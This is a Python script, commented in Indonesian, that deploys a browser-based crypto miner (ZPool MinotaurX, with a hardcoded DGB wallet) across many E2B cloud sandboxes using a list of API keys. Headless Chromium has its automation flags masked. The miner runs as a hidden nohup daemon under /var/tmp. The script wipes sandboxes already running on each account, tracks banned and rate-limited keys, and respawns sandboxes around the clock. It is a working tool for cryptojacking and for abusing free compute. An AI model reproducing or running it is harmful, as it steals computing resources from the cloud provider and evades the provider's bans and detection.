import os
import sys
import time
import json
import signal
import argparse
import requests
import urllib.parse
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Pastikan console stdout mendukung UTF-8 di Windows dan unbuffered
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
        sys.stderr.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
    except Exception:
        pass

# Cek import E2B SDK
try:
    from e2b import Sandbox, Template
except ImportError:
    print("[ERROR] E2B SDK belum terinstall! Silakan install: pip install e2b requests")
    sys.exit(1)

# Default Fallback Config (ZPool MinotaurX Webminer Runner)
DEFAULT_CONFIG = {
    "mode": "zpool",
    "template_name": "core-zpool-8c",
    "slots_per_key": 20,
    "cpu_count": 8,
    "workers_count": 8,
    "memory_mb": 8192,
    "sandbox_timeout_seconds": 3000,
    "duration_minutes": 50,
    "auto_respawn": True,
    "algorithm": "cwm_minotaurx",
    "host": "minotaurx.sea.mine.zpool.ca",
    "port": 7019,
    "worker_wallet": "DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM",
    "password": "c=DGB",
    "keys_file": "list.txt",
    "concurrency_limit": 3,
    "spawn_delay_seconds": 1.0
}

CONFIG_FILE = "config_zpool.json" if os.path.exists("config_zpool.json") else "config.json"

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8-sig") as f:
                data = json.load(f)
                merged = DEFAULT_CONFIG.copy()
                merged.update(data)
                return merged
        except Exception as e:
            print(f"[!] Gagal membaca {CONFIG_FILE}: {e}. Menggunakan default.")
    return DEFAULT_CONFIG.copy()

def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
    except Exception as e:
        print(f"[!] Gagal menyimpan {CONFIG_FILE}: {e}")

# Global State Tracker
is_running = True
active_sandboxes = {} # worker_key -> info dict
banned_keys = set()
quota_keys = set()
lock = threading.Lock()

SYS_DIR = "/var/tmp/.zpool_runner"
LOG_FILE = "/tmp/zpool_miner.log"

ZPOOL_RUNNER_TEMPLATE = """# Auto-generated ZPool MinotaurX Webminer Runner
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import os
import sys
import shutil
from datetime import datetime

BOT_LABEL = "__BOT_LABEL__"
BASE_URL = "__BASE_URL__"
HASHRATE_SEL = "span#hashrate strong"
HEARTBEAT_EVERY = 15

print(f"[{BOT_LABEL}] Initializing ZPool Webminer Runner...")
print(f"[{BOT_LABEL}] Target URL: {BASE_URL}")

chrome_options = Options()
for arg in [
    "--headless=new",
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-blink-features=AutomationControlled",
    "--disable-infobars",
    "--disable-extensions",
    "--disable-gpu",
    "--no-default-browser-check",
    "--no-first-run",
    "--disable-web-security",
    "--disable-notifications",
    "--disable-popup-blocking",
    "--ignore-certificate-errors",
    "--disable-logging",
    "--log-level=3",
]:
    chrome_options.add_argument(arg)

chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
chrome_options.add_experimental_option("useAutomationExtension", False)

detected_driver = shutil.which("chromedriver") or shutil.which("chromium-driver")
driver = None

try:
    if detected_driver and os.path.exists(detected_driver):
        from selenium.webdriver.chrome.service import Service
        driver = webdriver.Chrome(service=Service(detected_driver), options=chrome_options)
    else:
        driver = webdriver.Chrome(options=chrome_options)
except Exception as e:
    print(f"[{BOT_LABEL}] Fallback browser launch: {e}")
    driver = webdriver.Chrome(options=chrome_options)

driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
    "source": "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});window.chrome={runtime:{}};"
})

try:
    print(f"[{BOT_LABEL}] Loading webminer SPA...")
    driver.get(BASE_URL)
    time.sleep(4)

    # Click start mining / retrigger
    try:
        btns = driver.find_elements(By.TAG_NAME, "button")
        for b in btns:
            txt = (b.text or "").strip().lower()
            if "stop mining" in txt:
                print(f"[{BOT_LABEL}] Memicu re-trigger (Stop -> Start)...")
                b.click()
                time.sleep(1.5)
                break
        
        btns = driver.find_elements(By.TAG_NAME, "button")
        for b in btns:
            txt = (b.text or "").strip().lower()
            if "start mining" in txt:
                b.click()
                print(f"[{BOT_LABEL}] Tombol Start Mining berhasil diklik!")
                time.sleep(2)
                break
    except Exception as trigger_err:
        print(f"[{BOT_LABEL}][!] Warning trigger click: {trigger_err}")

    try:
        WebDriverWait(driver, 45).until(EC.presence_of_element_located((By.CSS_SELECTOR, HASHRATE_SEL)))
        print(f"[{BOT_LABEL}] âœ… Hashrate element ditemukan, mulai loop mining!")
    except Exception:
        print(f"[{BOT_LABEL}][!] Hashrate element belum siap, tetap melanjutkan...")

    n = 0
    errs = 0
    while True:
        try:
            hr = driver.find_element(By.CSS_SELECTOR, HASHRATE_SEL).text
            n += 1
            errs = 0
            print(f"[{BOT_LABEL}] Speed: {hr} | #{n}")
        except Exception as e:
            errs += 1
            print(f"[{BOT_LABEL}][!] Hashrate read error #{errs}: {e}")
            if errs >= 5:
                try:
                    print(f"[{BOT_LABEL}] Refreshing browser setelah 5 error berturut...")
                    driver.refresh()
                    time.sleep(5)
                    errs = 0
                except Exception:
                    errs = 0
        time.sleep(HEARTBEAT_EVERY)

except Exception as e:
    print(f"[{BOT_LABEL}][!] Fatal Error: {e}")
finally:
    if driver:
        try: driver.quit()
        except: pass
"""

def build_zpool_python_script(cfg, worker_label):
    algo = cfg.get("algorithm", "cwm_minotaurx")
    host = cfg.get("host", "minotaurx.sea.mine.zpool.ca")
    port = cfg.get("port", 7019)
    wallet = cfg.get("worker_wallet", "DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM")
    pwd = urllib.parse.quote(cfg.get("password", "c=DGB"))
    workers = cfg.get("workers_count", 8)

    base_url = f"https://webminer.pages.dev?algorithm={algo}&host={host}&port={port}&worker={wallet}&password={pwd}&workers={workers}"

    return ZPOOL_RUNNER_TEMPLATE.replace("__BOT_LABEL__", worker_label).replace("__BASE_URL__", base_url)

def ensure_template_exists(api_key, template_name="core-zpool-8c", cpu_count=8, memory_mb=8192, label="E2B"):
    """Cek ketersediaan template di akun E2B; jika belum ada, otomatis build template 8 vCPU & 8GB RAM dengan pre-installed Chromium & Selenium"""
    if not template_name or template_name.lower() == "base":
        return "base"
    
    try:
        if Template.exists(template_name, api_key=api_key):
            print(f"[{label}] âœ… Template 8-Core '{template_name}' siap di akun ini.")
            return template_name
        
        print(f"[{label}] ðŸ“¦ Template '{template_name}' belum ada di akun E2B ini.")
        print(f"[{label}] ðŸ”¨ Memulai auto-build template '{template_name}' (8 vCPU, 8GB RAM + Pre-installed Chromium & Selenium)...")
        
        builder = (
            Template()
            .from_template("base")
            .run_cmd(
                "sudo apt-get update -y && "
                "sudo apt-get install -y chromium chromium-driver python3-pip && "
                "pip install --no-cache-dir selenium requests packaging"
            )
        )
        build_info = Template.build(
            builder,
            name=template_name,
            cpu_count=cpu_count,
            memory_mb=memory_mb,
            api_key=api_key
        )
        print(f"[{label}] ðŸŽ‰ Template '{template_name}' BERHASIL DI-BUILD (8 vCPU, Chromium & Selenium)! Deploy akan instan!")
        return template_name
    except Exception as e:
        print(f"[{label}] âš ï¸ Info build template '{template_name}': {e}. Menggunakan 'base'.")
        return "base"

def clean_remote_orphan_sandboxes(api_key, label="E2B"):
    """Bersihkan sandbox lama/orphan di cloud via REST API E2B secara cepat & paralel"""
    try:
        headers = {"X-API-Key": api_key, "Accept": "application/json"}
        resp = requests.get("https://api.e2b.dev/sandboxes", headers=headers, timeout=10)
        if resp.status_code in (401, 403):
            print(f"[{label}] ðŸš« Akun/Team terindikasi BANNED/INVALID (HTTP {resp.status_code}). Menandai token.")
            with lock:
                banned_keys.add(api_key)
            return
        if resp.status_code == 200:
            data = resp.json()
            sandboxes = data if isinstance(data, list) else data.get("sandboxes", data.get("data", []))
            if sandboxes:
                print(f"[{label}] ðŸ§¹ Ditemukan {len(sandboxes)} sandbox aktif di cloud. Membersihkan secara paralel...")
                def delete_one(s):
                    s_id = s.get("sandboxID") or s.get("sandboxId") or s.get("id")
                    if s_id:
                        try:
                            requests.delete(f"https://api.e2b.dev/sandboxes/{s_id}", headers=headers, timeout=5)
                        except Exception:
                            pass
                with ThreadPoolExecutor(max_workers=20) as ex:
                    list(ex.map(delete_one, sandboxes))
                time.sleep(1)
                print(f"[{label}] âœ… Cloud sandbox bersih.")
    except Exception as e:
        pass

def parse_keys_file(filepath):
    if not os.path.exists(filepath):
        return []
    
    accounts = []
    with open(filepath, "r", encoding="utf-8-sig") as f:
        for line_no, raw_line in enumerate(f, 1):
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            
            label = f"key-{line_no}"
            token = ""

            if "|" in line:
                parts = [p.strip() for p in line.split("|")]
                found_token = None
                for part in parts:
                    if part.startswith("e2b_"):
                        found_token = part
                        break
                
                if found_token:
                    token = found_token
                    label = parts[0] if parts[0] != token else f"user-{line_no}"
                else:
                    if len(parts) >= 2:
                        label = parts[0]
                        token = parts[1]
                    else:
                        token = parts[0]
            else:
                token = line.strip()

            if token:
                accounts.append({
                    "index": line_no,
                    "label": label,
                    "token": token
                })
    return accounts

def spawn_single_sandbox(cfg, account, slot_index):
    token = account["token"]
    label = account["label"]
    worker_name = f"{label.replace(' ', '_')}-zpool-slot-{slot_index}"
    worker_key = f"{token[:12]}-{slot_index}"
    timeout_sec = cfg.get("sandbox_timeout_seconds", 3000)
    template_name = account.get("ready_template") or cfg.get("template_name", "core-zpool-8c")

    if token in banned_keys:
        return {"status": "banned", "worker_name": worker_name, "error": "Team is banned"}
    if token in quota_keys:
        return {"status": "quota_limit", "worker_name": worker_name, "error": "Quota limit reached"}

    print(f"   ðŸš€ [{label}] Memulai ZPool Sandbox Slot #{slot_index} ({worker_name}) [Tpl: {template_name}]...")
    sbx = None

    try:
        # 1. Spawn Sandbox dengan E2B SDK (Timeout Request 180s)
        try:
            sbx = Sandbox.create(
                template=template_name,
                api_key=token,
                timeout=timeout_sec,
                request_timeout=180,
                envs={
                    "WORKER_NAME": worker_name,
                    "BOT_LABEL": worker_name,
                }
            )
        except Exception as tpl_err:
            if "not found" in str(tpl_err).lower() and template_name != "base":
                print(f"      âš ï¸ Template '{template_name}' tidak ditemukan, fallback ke 'base'...")
                sbx = Sandbox.create(
                    template="base",
                    api_key=token,
                    timeout=timeout_sec,
                    request_timeout=180,
                    envs={
                        "WORKER_NAME": worker_name,
                        "BOT_LABEL": worker_name,
                    }
                )
            else:
                raise tpl_err

        sandbox_id = sbx.sandbox_id
        print(f"      âœ… Sandbox ID [{sandbox_id}] Berhasil Dibuat (8-Core CPU)!")

        # 2. Deploy Python Runner File (Instan < 10ms via Filesystem API)
        runner_content = build_zpool_python_script(cfg, worker_name)
        sbx.commands.run(f"mkdir -p {SYS_DIR}", timeout=30, request_timeout=30)
        sbx.files.write(f"{SYS_DIR}/main.py", runner_content)

        # 3. Setup Dependencies jika belum ada di template (Instan jika sudah ada di core-zpool-8c)
        setup_cmd = (
            "[ -f /usr/bin/chromium ] || which chromium chromium-driver google-chrome >/dev/null 2>&1 || ("
            "sudo apt-get update -qq && "
            "sudo apt-get install -y -qq chromium chromium-driver python3-pip || true); "
            "python3 -c 'import selenium, requests' >/dev/null 2>&1 || pip install -q selenium requests packaging || true"
        )
        sbx.commands.run(setup_cmd, timeout=120, request_timeout=120)

        # 4. Jalankan ZPool Runner di Background sebagai Detached Daemon (100% Persisten)
        cmd_str = f"(nohup python3 {SYS_DIR}/main.py </dev/null >{LOG_FILE} 2>&1 &)"
        sbx.commands.run(cmd_str, timeout=30, request_timeout=30)

        now = datetime.now()
        expires_at = now + timedelta(seconds=timeout_sec)

        info = {
            "worker_name": worker_name,
            "sandbox_id": sandbox_id,
            "token": token,
            "label": label,
            "slot_index": slot_index,
            "created_at": now,
            "expires_at": expires_at,
            "sbx_obj": sbx,
            "status": "RUNNING"
        }

        with lock:
            active_sandboxes[worker_key] = info

        print(f"      ðŸ”¥ [ACTIVE] {worker_name} (ZPool MinotaurX) AKTIF & MINING! (Timeout: {timeout_sec//60}m)\n")
        return {"status": "success", "info": info}

    except Exception as e:
        err_msg = str(e)
        print(f"      âŒ Gagal spawn {worker_name}: {err_msg}")

        if sbx:
            try: sbx.kill()
            except Exception: pass

        if "banned" in err_msg.lower() or "403" in err_msg or "unauthorized" in err_msg.lower():
            print(f"      ðŸš« Akun/Team {label} terindikasi BANNED/INVALID oleh E2B.")
            with lock:
                banned_keys.add(token)
            return {"status": "banned", "worker_name": worker_name, "error": err_msg}

        if "limit" in err_msg.lower() or "quota" in err_msg.lower() or "rate" in err_msg.lower() or "429" in err_msg:
            print(f"      âš ï¸ Kuota/Rate Limit (Max 20 Sandboxes) tercapai untuk {label}.")
            with lock:
                quota_keys.add(token)
            return {"status": "quota_limit", "worker_name": worker_name, "error": err_msg}

        return {"status": "error", "worker_name": worker_name, "error": err_msg}

def deploy_all(cfg, accounts):
    slots = cfg.get("slots_per_key", 20)
    concurrency = cfg.get("concurrency_limit", 20)
    template_target = cfg.get("template_name", "core-zpool-8c")

    # Bersihkan orphan sandbox & pastikan template 8-Core siap sebelum mulai (Paralel)
    def prepare_account(acc):
        if acc["token"] not in banned_keys:
            clean_remote_orphan_sandboxes(acc["token"], acc["label"])
            tpl = ensure_template_exists(acc["token"], template_target, cfg.get("cpu_count", 8), cfg.get("memory_mb", 8192), acc["label"])
            acc["ready_template"] = tpl
        return acc

    with ThreadPoolExecutor(max_workers=max(1, len(accounts))) as ex:
        accounts = list(ex.map(prepare_account, accounts))

    tasks = []
    for acc in accounts:
        token = acc["token"]
        if token in banned_keys:
            continue
        for slot in range(1, slots + 1):
            tasks.append((acc, slot))

    if not tasks:
        print(f"\n=======================================================")
        print(f"âš ï¸ Tidak ada sandbox yang dapat dideploy (Semua key Banned / Invalid).")
        print(f"=======================================================\n")
        return []

    spawn_delay = cfg.get("spawn_delay_seconds", 1.0)
    print(f"\n=======================================================")
    print(f"ðŸ“¦ Total Target Sandbox: {len(tasks)} ({len(accounts)} Akun x {slots} Slots/Akun)")
    print(f"âš¡ Mode Mining          : ZPool Webminer (MinotaurX / Selenium)")
    print(f"âš¡ CPU per Sandbox     : {cfg.get('cpu_count', 8)} vCPU | {cfg.get('workers_count', 8)} Workers/Threads")
    print(f"âš¡ Concurrency Worker   : {concurrency} Worker Santai (Jeda: {spawn_delay}s per slot)")
    print(f"=======================================================\n")

    results = []
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = []
        for acc, slot in tasks:
            fut = executor.submit(spawn_single_sandbox, cfg, acc, slot)
            futures.append(fut)
            if spawn_delay > 0:
                time.sleep(spawn_delay)

        for fut in as_completed(futures):
            res = fut.result()
            results.append(res)

    success_count = sum(1 for r in results if r["status"] == "success")
    print(f"\n=======================================================")
    print(f"ðŸ“Š Ringkasan Deploy: {success_count}/{len(tasks)} ZPool Sandbox Berhasil Aktif!")
    print(f"=======================================================\n")
    return results

def monitor_and_respawn_loop(cfg, accounts):
    global is_running
    slots = cfg.get("slots_per_key", 20)
    check_interval = 30
    start_time = datetime.now()

    print("ðŸ”„ Mode Auto-Respawn Daemon AKTIF. Memonitor & menjaga Sandbox ZPool tetap hidup 24/7...")
    print("Tekan Ctrl + C untuk keluar kapan saja.\n")

    while is_running:
        try:
            now = datetime.now()
            uptime_str = str(now - start_time).split(".")[0]

            to_respawn = []
            with lock:
                for acc in accounts:
                    token = acc["token"]
                    if token in banned_keys:
                        continue
                    
                    for slot in range(1, slots + 1):
                        worker_key = f"{token[:12]}-{slot}"
                        if worker_key not in active_sandboxes:
                            to_respawn.append((acc, slot))
                        else:
                            info = active_sandboxes[worker_key]
                            remaining_sec = (info["expires_at"] - now).total_seconds()
                            if remaining_sec <= 120:
                                print(f"â° Sandbox {info['worker_name']} mendekati batas timeout (Sisa {int(remaining_sec)}s). Me-respawn...")
                                try:
                                    info["sbx_obj"].kill()
                                except Exception:
                                    pass
                                del active_sandboxes[worker_key]
                                to_respawn.append((acc, slot))

            if to_respawn:
                print(f"âœ¨ Menjalankan respawn untuk {len(to_respawn)} slot...")
                with lock:
                    quota_keys.clear()
                for acc, slot in to_respawn:
                    if not is_running:
                        break
                    spawn_single_sandbox(cfg, acc, slot)
                    time.sleep(0.5)

            with lock:
                active_count = len(active_sandboxes)
                banned_count = len(banned_keys)

            print(f"[{now.strftime('%H:%M:%S')}] ðŸŸ¢ Status: {active_count} ZPool Sandbox Aktif | â±ï¸ Uptime: {uptime_str} | ðŸš« Banned Key: {banned_count}")
            
            for _ in range(check_interval):
                if not is_running:
                    break
                time.sleep(1)

        except Exception as e:
            print(f"âš ï¸ Error pada monitor loop: {e}")
            time.sleep(5)

def signal_handler(sig, frame):
    global is_running
    print("\n\nðŸ›‘ Menerima sinyal STOP (Ctrl+C)... Menghentikan Deployer dengan aman.")
    is_running = False

def main():
    signal.signal(signal.SIGINT, signal_handler)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, signal_handler)

    parser = argparse.ArgumentParser(description="E2B ZPool Webminer Cloud Sandbox Auto-Deployer")
    parser.add_argument("--template", "-tmpl", default=None, help="Nama template E2B (default: core-yok7h-t4 atau base)")
    parser.add_argument("--file", "-f", default=None, help="File path berisi E2B API Key (default: list.txt)")
    parser.add_argument("--slots", "-s", type=int, default=None, help="Jumlah sandbox per API Key (default: 20)")
    parser.add_argument("--timeout", "-t", type=int, default=None, help="Sandbox timeout dalam detik (default: 3000 / 50m)")
    parser.add_argument("--wallet", "-w", default=None, help="Wallet ZPool / DGB")
    parser.add_argument("--workers", type=int, default=None, help="Jumlah worker threads per sandbox (default: 8)")
    parser.add_argument("--once", action="store_true", help="Jalankan sekali tanpa monitor/auto-respawn loop")
    parser.add_argument("--daemon", action="store_true", help="Paksa jalankan daemon auto-respawn 24/7")

    args = parser.parse_args()

    cfg = load_config()

    if args.template:
        cfg["template_name"] = args.template
    if args.slots:
        cfg["slots_per_key"] = args.slots
    if args.timeout:
        cfg["sandbox_timeout_seconds"] = args.timeout
    if args.wallet:
        cfg["worker_wallet"] = args.wallet
    if args.workers:
        cfg["workers_count"] = args.workers
    if args.file:
        cfg["keys_file"] = args.file

    keys_file = cfg.get("keys_file", "list.txt")
    template_name = cfg.get("template_name", "core-yok7h-t4")

    print(f"""
=============================================================
  âš¡ E2B ZPOOL WEBMINER AUTO-DEPLOYER (MinotaurX Runner)
  ðŸ”¥ 8 vCPU | 16 Worker Threads | Selenium Headless Browser
  ðŸ›¡ï¸ 20 Slots/Key | 24/7 Auto Keep-Alive Daemon
=============================================================
""")
    print(f"âš™ï¸  Konfigurasi:")
    print(f"   â€¢ Template E2B       : {template_name}")
    print(f"   â€¢ File Key           : {keys_file}")
    print(f"   â€¢ Slots per Key      : {cfg['slots_per_key']} Slots (Max 20/Token)")
    print(f"   â€¢ Sandbox CPU        : {cfg['cpu_count']} vCPU | RAM: {cfg.get('memory_mb', 8192)} MB")
    print(f"   â€¢ Mining Threads     : {cfg['workers_count']} Threads / Workers")
    print(f"   â€¢ Algorithm          : {cfg['algorithm']} (Host: {cfg['host']}:{cfg['port']})")
    print(f"   â€¢ Wallet ZPool       : {cfg['worker_wallet']} (Password: {cfg['password']})")
    print(f"   â€¢ Timeout Sandbox    : {cfg['sandbox_timeout_seconds']} detik ({cfg['sandbox_timeout_seconds']//60} menit)")
    print(f"   â€¢ Auto-Respawn Loop  : {'ON (24/7 Keepalive)' if (cfg['auto_respawn'] or args.daemon) and not args.once else 'OFF (One-Shot)'}")
    print(f"=============================================================\n")

    accounts = parse_keys_file(keys_file)
    if not accounts:
        print(f"âŒ Error: File '{keys_file}' tidak ditemukan atau kosong!")
        print(f"â„¹ï¸ Silakan tambahkan E2B API Key ke file '{keys_file}' (satu key per baris atau label|key).")
        sys.exit(1)

    print(f"ðŸ“‹ Ditemukan {len(accounts)} API Key di '{keys_file}':")
    for acc in accounts:
        print(f"   [{acc['index']}] {acc['label']} ({acc['token'][:10]}...{acc['token'][-4:]})")

    deploy_all(cfg, accounts)

    if (cfg.get("auto_respawn", True) or args.daemon) and not args.once:
        monitor_and_respawn_loop(cfg, accounts)
    else:
        print("âœ… Deploy selesai. Program ditutup (One-Shot mode).")

if __name__ == "__main__":
    main()
